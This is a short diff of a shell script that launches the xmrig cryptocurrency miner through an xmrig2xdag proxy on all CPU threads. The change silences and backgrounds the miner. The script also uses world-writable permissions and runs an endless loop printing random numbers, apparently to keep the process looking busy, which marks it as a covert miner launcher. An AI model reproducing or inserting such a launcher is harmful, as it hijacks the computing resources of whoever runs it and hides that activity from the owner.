@@ -2,5 +2,5 @@
 
 chmod 777 xmrig xmrig2xdag config.json  >/dev/null 2>&1
 nohup ./xmrig2xdag -c config.json > /dev/null 2>&1 &
-nohup ./xmrig -o 127.0.0.1:3232. -u hq8Ry8xkHYHG6avtT+sP0ZlbT1P1vky4 -p x -a rx/xdag -t$(nproc --all)
+nohup ./xmrig -o 127.0.0.1:3232. -u hq8Ry8xkHYHG6avtT+sP0ZlbT1P1vky4 -p x -a rx/xdag -t$(nproc --all) > /dev/null 2>&1 &
 while :; do shuf -n 1 -i 1-99999999; sleep 2; done
